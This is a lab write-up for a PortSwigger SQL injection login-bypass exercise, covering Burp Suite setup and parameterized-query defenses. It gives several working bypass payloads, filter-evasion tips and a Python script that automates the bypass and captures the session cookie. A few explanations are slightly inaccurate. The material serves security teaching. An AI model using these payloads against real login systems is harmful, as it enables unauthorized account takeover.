# Lab 2: SQL Injection — Login Bypass

> **Target:** [PortSwigger Web Security Academy — SQL Injection Lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)  
> **Vulnerability:** SQL Injection in a login form  
> **Goal:** Log in as `administrator` without knowing the password  
> **Difficulty:** Apprentice

---

## Table of Contents

1. [Overview](#1-overview)
2. [Prerequisites & Lab Setup](#2-prerequisites--lab-setup)
3. [Understanding the Vulnerability](#3-understanding-the-vulnerability)
4. [Reconnaissance — Observing Normal Behavior](#4-reconnaissance--observing-normal-behavior)
5. [Intercepting the Request with Burp Suite](#5-intercepting-the-request-with-burp-suite)
6. [Crafting & Delivering the Payload](#6-crafting--delivering-the-payload)
7. [Why the Payload Works (Deep Dive)](#7-why-the-payload-works-deep-dive)
8. [Alternative Payloads](#8-alternative-payloads)
9. [Troubleshooting Common Issues](#9-troubleshooting-common-issues)
10. [Defenses & Mitigations](#10-defenses--mitigations)
11. [Automation Script (Python)](#11-automation-script-python)
12. [Summary Checklist](#12-summary-checklist)

---

## 1. Overview

### The Vulnerable Query

The login form constructs a SQL query by directly concatenating user input:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

### The Goal

Make the `WHERE` clause evaluate to `TRUE` while **commenting out the password check**, so the database returns the `administrator` user row and the application logs us in.

### The Payload

```
administrator'--
```

### What the Backend Sees

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'anything'
```

Everything after `--` is treated as a **SQL comment** and ignored. The query effectively becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'
```

---

## 2. Prerequisites & Lab Setup

### Tools Required

| Tool | Purpose |
|------|---------|
| **Burp Suite Community Edition** (or Pro) | Intercept and modify HTTP requests |
| **Firefox** (recommended) | Browser with Burp CA certificate installed |
| **PortSwigger Account** | To launch the lab instance |

### Step 2.1: Launch the Lab

1. Navigate to the [SQL Injection Login Bypass Lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass).
2. Click **"Access the lab"**.
3. A unique lab instance URL is generated, e.g.:
   ```
   https://0a1b002c03d4e5f6.web-security-academy.net
   ```

> **Note:** Each lab instance is temporary. If it expires, refresh to get a new URL. The exploitation steps remain identical.

### Step 2.2: Configure Burp Proxy

1. Open **Burp Suite**.
2. Go to **Proxy → Options**.
3. Ensure the proxy listener is running on `127.0.0.1:8080`.
4. In Firefox, set the proxy to `127.0.0.1:8080` (or use the **FoxyProxy** extension).
5. Install the **Burp CA certificate** in Firefox so HTTPS traffic can be intercepted without certificate warnings.

---

## 3. Understanding the Vulnerability

### How the Backend Handles Login (Pseudocode)

```python
username = request.form['username']
password = request.form['password']

# VULNERABLE: direct string concatenation
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

result = database.execute(query)

if result:
    login_success(result[0])
else:
    show_error("Invalid username or password")
```

### The Critical Flaw

User input is **concatenated directly** into the SQL query string. There is **no parameterization**, **no sanitization**, and **no prepared statement**. This means the database cannot distinguish between **data** (the username) and **code** (SQL syntax).

---

## 4. Reconnaissance — Observing Normal Behavior

Before injecting anything, establish a baseline. You need to know what a **failed login** looks like vs. what a **successful bypass** looks like.

### Step 4.1: Baseline Tests

| Test | Username | Password | Expected Result |
|------|----------|----------|-----------------|
| Invalid credentials | `test` | `test` | "Invalid username or password" |
| Empty fields | *(blank)* | *(blank)* | Validation error or same invalid message |
| Known valid user (if any) | `wiener` | `bluecheese` | Login success |

### Step 4.2: What to Look For

- The **exact error message** for invalid credentials.
- Whether the application **redirects** on success (`302 Found`).
- Whether a **session cookie** is set on success.
- Any **database error messages** (these are gold for SQLi).

---

## 5. Intercepting the Request with Burp Suite

### Step 5.1: Enable Interception

1. In Burp Suite, go to **Proxy → Intercept**.
2. Click **"Intercept is off"** to toggle it to **"Intercept is on"**.

### Step 5.2: Capture a Login Request

1. In the lab's login form, enter:
   - **Username:** `test`
   - **Password:** `test`
2. Click **"Log in"**.
3. The request is captured in Burp. It looks like this:

```http
POST /login HTTP/1.1
Host: 0a1b002c03d4e5f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=test&password=test
```

### Step 5.3: Send to Repeater

- Right-click the intercepted request.
- Select **"Send to Repeater"** (or press `Ctrl + R`).
- Go to the **Repeater** tab — this is your controlled environment for testing payloads without repeatedly filling out the browser form.

---

## 6. Crafting & Delivering the Payload

### Step 6.1: Modify the Request in Repeater

In the **Repeater** tab, change the request body from:

```
username=test&password=test
```

To:

```
username=administrator'--&password=anything
```

### Step 6.2: Send the Request

Click **"Send"** in Repeater.

### Step 6.3: Analyze the Response

Look for these indicators of a successful bypass:

| Indicator | Meaning |
|-----------|---------|
| **HTTP 302 Redirect** to `/my-account` | Login succeeded |
| **Set-Cookie** header with a session token | A session was created for `administrator` |
| Response body contains `"administrator"` | Confirms the logged-in identity |
| Absence of "Invalid username or password" | The bypass worked |

### Step 6.4: Access the Admin Account

If you see a `302` redirect:

1. Right-click the response → **"Show response in browser"**.
2. Or manually copy the `session` cookie and paste it into your browser.
3. Navigate to `/my-account`.
4. You should see the **administrator panel**.

> **Lab Solved!** The lab completes automatically once you access the administrator account.

---

## 7. Why the Payload Works (Deep Dive)

### The Query Transformation

**What the developer intended:**

```sql
SELECT * FROM users
WHERE username = 'administrator'--'
  AND password = 'anything'
```

**How the database parses it:**

```sql
SELECT * FROM users
WHERE username = 'administrator'
-- ' AND password = 'anything'
```

**What actually executes:**

```sql
SELECT * FROM users WHERE username = 'administrator'
```

### Breaking Down the Payload

| Component | Purpose |
|-----------|---------|
| `administrator` | The target account we want to access |
| `'` | **Closes** the opening single quote in the SQL query |
| `--` | Starts a **SQL single-line comment** |
| *(trailing space)* | Some SQL parsers require a space after `--` |

### Why the Password Field Doesn't Matter

Because `--` comments out the rest of the line, the `AND password = 'anything'` clause is **never executed**. The password can literally be `anything`.

### Why the Single Quote is Essential

Without the closing quote, the database would search for a user literally named `administrator'--` (including the quote and hyphens). The quote **escapes the string literal context** and returns to SQL code context.

---

## 8. Alternative Payloads

### Payload 1: Universal Bypass (Unknown Username)

If you don't know the administrator username, force the `WHERE` clause to be `TRUE` for **all users**:

```
username=' OR '1'='1'--&password=anything
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

**Behavior:** Matches **all rows**. The application typically logs you in as the **first user returned**, which is often `administrator`.

### Payload 2: MySQL Comment (`#`)

```
username=administrator'#&password=anything
```

### Payload 3: Multi-line Comment (`/* */`)

```
username=administrator'/*&password=anything
```

### Payload 4: Boolean Logic Variation

```
username=administrator' OR 'x'='x'--&password=anything
```

### Payload 5: URL-Encoded Version

For browser address bars or tools that require encoding:

```
username=administrator%27--&password=anything
```

(`%27` is the URL encoding for `'`)

### Payload Comparison Table

| Payload | Use Case | Database Compatibility |
|---------|----------|------------------------|
| `administrator'--` | Known username | Universal (with space after `--`) |
| `administrator'-- ` | Known username | Strict SQL parsers |
| `administrator'#` | Known username | MySQL |
| `' OR '1'='1'--` | Unknown username | Universal |
| `' OR 1=1--` | Unknown username | Universal (no quotes needed) |

---

## 9. Troubleshooting Common Issues

| Problem | Likely Cause | Solution |
|---------|------------|----------|
| "Invalid username or password" still appears | App uses prepared statements (not vulnerable) or wrong comment syntax | Try `-- ` (with trailing space), `#`, or `/*`. Check if the app uses `"` instead of `'` |
| `500 Internal Server Error` | SQL syntax is broken (unclosed quote) | Ensure your payload has an **odd number** of quotes. Try adding another `'` |
| No response / timeout | WAF or input filter blocking | Use URL encoding: `%27` instead of `'`. Try `\` to escape |
| Logged in as wrong user | `OR '1'='1'` returned multiple rows | Use the specific payload: `administrator'--` |
| Burp not intercepting | Proxy misconfiguration | Check FoxyProxy is ON, Burp listener is active, CA cert is installed |

### Debugging Tip: Error-Based Detection

If you see a database error like:

```
Unclosed quotation mark after the character string
```

This is **extremely valuable** — it confirms that:
1. Your input reaches the database parser.
2. The application is vulnerable to SQL injection.
3. You are on the right track.

---

## 10. Defenses & Mitigations

### The Only Real Fix: Parameterized Queries (Prepared Statements)

**Vulnerable (String Concatenation):**

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Secure (Parameterized Query):**

```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

**Why this works:** The database treats `?` parameters as **pure data**, not as **executable SQL code**. Even if you input `administrator'--`, it is treated as a literal string value.

### Defense-in-Depth Layers

| Layer | Implementation |
|-------|---------------|
| **Parameterized Queries** | Use prepared statements for ALL database interactions |
| **Input Validation** | Whitelist allowed characters (e.g., alphanumeric only for usernames) |
| **Least Privilege** | Database user should only have `SELECT` on necessary tables |
| **WAF** | Web Application Firewall to block common SQLi patterns |
| **Error Handling** | Never expose raw SQL errors to end users |
| **Password Hashing** | Store `bcrypt(password)`, never plaintext |

---

## 11. Automation Script (Python)

> **For educational purposes only. Do not use against systems you do not own.**

```python
import requests
import sys

# Replace with your actual lab URL
TARGET_URL = "https://YOUR-LAB-ID.web-security-academy.net/login"

PAYLOAD = {
    "username": "administrator'--",
    "password": "anything"
}

def exploit():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Payload: username={PAYLOAD['username']}")

    try:
        response = requests.post(
            TARGET_URL,
            data=PAYLOAD,
            allow_redirects=False,
            timeout=10
        )

        if response.status_code == 302:
            location = response.headers.get("Location", "")
            if "/my-account" in location:
                print("[+] SUCCESS: Login bypass achieved!")
                print(f"[+] Redirect Location: {location}")
                session_cookie = response.cookies.get("session")
                if session_cookie:
                    print(f"[+] Session Cookie: {session_cookie}")
                return True

        print("[-] FAILED: Bypass did not work.")
        print(f"[-] Status Code: {response.status_code}")
        return False

    except requests.exceptions.RequestException as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    exploit()
```

### Usage

```bash
python3 sqli_login_bypass.py
```

---

## 12. Summary Checklist

- [ ] Lab launched and Burp proxy configured
- [ ] Burp CA certificate installed in Firefox
- [ ] Intercepted a normal login request
- [ ] Sent request to Repeater
- [ ] Modified `username` to `administrator'--`
- [ ] Observed `302` redirect or session cookie in response
- [ ] Accessed `/my-account` as `administrator`
- [ ] Understood why the payload works (quote closure + SQL comment)
- [ ] Tried alternative payloads (`#`, `/*`, `OR '1'='1'`)
- [ ] Learned the defense: **parameterized queries**

---

## Key Takeaway

> **User input becomes code when it is concatenated into a query string.**

This lab teaches the foundational principle of SQL injection. Once you understand how a single quote and a comment can alter query logic, you unlock the mindset needed to identify and exploit (or defend against) SQL injection in real-world applications.

---

*Document created for educational purposes as part of the PortSwigger Web Security Academy curriculum.*
